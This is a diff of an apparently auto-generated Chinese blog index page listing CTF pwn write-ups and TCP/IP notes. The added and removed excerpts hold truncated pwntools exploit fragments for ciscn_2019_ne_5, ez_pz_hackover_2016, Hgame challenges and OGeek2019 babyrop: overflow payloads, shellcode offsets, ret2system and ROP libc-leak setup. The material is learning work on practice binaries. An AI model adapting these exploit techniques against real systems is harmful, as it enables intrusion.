@@ -82,6 +82,12 @@
             <a class="nav-link" href="/about/">About</a>
           </li>
         
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/Links/">Links</a>
+          </li>
+        
         
           <li class="nav-item" id="search-btn">
             <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
@@ -129,168 +135,6 @@
               <div class="col-12 col-md-10 m-auto">
                 
 
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/01/20/ciscn_2019_ne_5-%E9%AA%9A%E9%AA%9A%E7%9A%84%E5%B0%8F%E4%B8%9C%E8%A5%BF/">
-        <p class="h4 index-header">ciscn_2019_ne_5-骚骚的小东西</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">ciscn_2019_ne_5-骚骚的小东西
-
-输入之后，在调用getflag这里会造成溢出
-
-函数里调用有system，但没有/bin/sh
-骚东西：
-0x80482E6 + 0x4就是 sh
-我们可以system(“sh”)也可以
-exp:
-from pwn import *
-context.log_level = &#39;debug&#39;
-context.arch = &#39;i386&#39;
-#sh = process(&#39;ciscn_2019_ne_5&#39;)
-sh = remote(&quot;node3.buuoj.cn&quot;,27887)
-elf = ELF(&quot;./ciscn_2019_ne_5&quot;)
-lib = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)
-
-pop_ret = 0x08048455
-sh.sendline(&quot;administrator&quot;)
-system = elf.plt[&#39;system&#39;]
-binsh = (0x80482</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-20&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/CTF">CTF</a>&nbsp;
-          
-            <a href="/categories/buu">buu</a>&nbsp;
-          &nbsp;
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/01/18/ez_pz_hackover_2016-%E7%BB%A7%E7%BB%AD%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0edb/">
-        <p class="h4 index-header">ez_pz_hackover_2016-继续深入学习edb</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">ez_pz_hackover_2016-继续深入学习edb
-
-
-
-
-得先绕过result的strcmp
-sh.recvuntil(&quot;&gt;&quot;)
-payload = &quot;crashme&quot;
-payload = payload.ljust(10,&quot;\x00&quot;)
-payload += cyclic(200)
-pause()
-sh.sendline(payload)
-pause时，打开edb并attach ez_pz_hackover_2016
-我常用：f8单步运行，ctrl+f9直接跳到ret，shift+f7进入函数运行
-
-
-
-一直运行到不能运行
-
-计算得偏移为16。
-然后，一开始给出了&amp;s的地址，加上没有打开nx。我们就可以在memcpy，溢出之后，将返回指针指向&amp;s里的shellcode
-
-一直运行到vuln的ret之后，我们看见了返回地址时0xffb64b7c,然后我们的shellcode在0xffb64b60，所以偏移就是0xffb64b7c-0xffb64b60 = 0x1c 
-得exp
-from pwn </div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-18&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/CTF">CTF</a>&nbsp;
-          
-            <a href="/categories/buu">buu</a>&nbsp;
-          
-            <a href="/categories/%E5%A4%87%E5%BF%98">备忘</a>&nbsp;
-          &nbsp;
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/01/16/Hgame/">
-        <p class="h4 index-header">Hgame</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">Hgame2020Hard_AAAAA
-
-V5在-0x31，s在-0xAC
-sh.recvuntil(&quot;Let&#39;s 0O0o\\0O0!&quot;)
-payload=&quot;a&quot;*(0xAC - 0x31)
-payload += &#39;0O0o\x00O0&#39;
-sh.send(payload)
-sh.interactive()
-One_Shot
-
-0xE0 - 0xC0之后刚好是32位，这样第
-payload = cyclic(0xE0 - 0xC0)
-sh.send(payload)
-sh.recvuntil(&quot;shot!\n&quot;)
-payload = str(6295776)
-sh.send(payload)
-ROP_LEVEL0open_read_puts# -*- coding: utf-8 -*-
-from pwn import *
-context.log_level = &#39;debug&#39;
-context.arch = &#39;amd64&#39;
-elf = ELF(&#39;./ROP_LEVE</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-16&nbsp;&nbsp;
-        
-        
-          <i class="iconfont icon-inbox"></i>
-          
-            <a href="/categories/CTF">CTF</a>&nbsp;
-          
-            <a href="/categories/Hgame">Hgame</a>&nbsp;
-          &nbsp;
-        
-        
-      </div>
-    </div>
-  </div>
 
   <div class="row mb-4 mx-auto">
     
@@ -602,6 +446,172 @@ mem_proc = 0x7</div>
             <a href="/categories/buu">buu</a>&nbsp;
           &nbsp;
         
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/01/09/%E6%A0%88%E8%BF%81%E7%A7%BB/">
+        <p class="h4 index-header">栈迁移</p>
+        
+        
+          
+          
+        
+        <div class="index-excerpt" style="max-height: none;">
+          <div class="index-text mb-1">The article has been encrypted, please enter your password to view....</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-09&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/CTF">CTF</a>&nbsp;
+          
+            <a href="/categories/%E5%B8%B8%E7%94%A8">常用</a>&nbsp;
+          &nbsp;
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/01/07/%5BOGeek2019%5Dbabyrop/">
+        <p class="h4 index-header">[OGeek2019]babyrop</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">[OGeek2019]babyrop
+程序
+
+为了绕过strncmp，我们在v6这里可以放一个\x00 因为strlen会在识别到\x00之后停止，这样strncmp就会默认返回0
+
+这里的v5返回值又跟下面的a1是一致的
+
+
+这里也没有啥可以调用的
+那就是rop，leak libc了
+EXPleak libc版#!/usr/bin/python2.7
+# -*- coding: utf-8 -*-
+from pwn import *
+context.log_level = &#39;debug&#39;
+context.arch = &#39;amd64&#39;
+elf = ELF(&#39;[OGeek2019]babyrop&#39;)
+lib = ELF(&quot;./libc-2.23.so&quot;)
+sh = 0
+def pwn(ip,port,debug):
+    global lib
+    global sh
+    if debug == 1:
+        sh = process(&#39;./[OGeek2019]babyrop&#39;)
+   </div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-07&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/CTF">CTF</a>&nbsp;
+          
+            <a href="/categories/buu">buu</a>&nbsp;
+          &nbsp;
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/01/04/TCPIP%E5%A4%8D%E4%B9%A0/">
+        <p class="h4 index-header">TCPIP复习</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">遗忘记录地址A类地址 公有1~126 
+
+
+
+地址类型
+公有
+私有
+
+
+
+A类
+1 ~ 126
+10.0.0.0 ~ 10.255.255.255
+
+
+B类
+128 ~ 191
+172.16.0.0 ~ 172.31.255.255
+
+
+C类
+192.0.0.0 ~ 223.255.255.255
+192.168.0.0 ~ 192.168.255.255
+
+
+直接交付和间接交付直接交付 -&gt; 交给同一个网络地址
+间接交付 -&gt; 经过一个直接交付，给路由器，再给路由器 直到到达同一个网络的路由再给主机
+端到端和点到点端到端 -&gt; 进程到进程
+点到点 -&gt; 设备到设备
+三元组五元组三元组：协议，IP地址，端口
+五元组：三元 + 源IP，源端口
+TCP 可靠性
+流量控制：滑动窗口 } 发送窗口
+拥塞控制： 拥塞窗口 重转定时器
+差错控制
+
+套接字
+流套接字：TCP 适合大量数据 单播
+数据报套接字： UDP
+原始套接字：编写自定底层协议
+
+IP多播==五个前提？==
+多播地址 224.0.0.0 ~ 239.255.255.255
+IP地址的低23位替换mac地址低</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-01-04&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/%E4%B8%93%E4%B8%9A%E5%AD%A6%E4%B9%A0">专业学习</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/%E4%B8%93%E4%B8%9A%E5%AD%A6%E4%B9%A0">专业学习</a>&nbsp;
+          
         
       </div>
     </div>
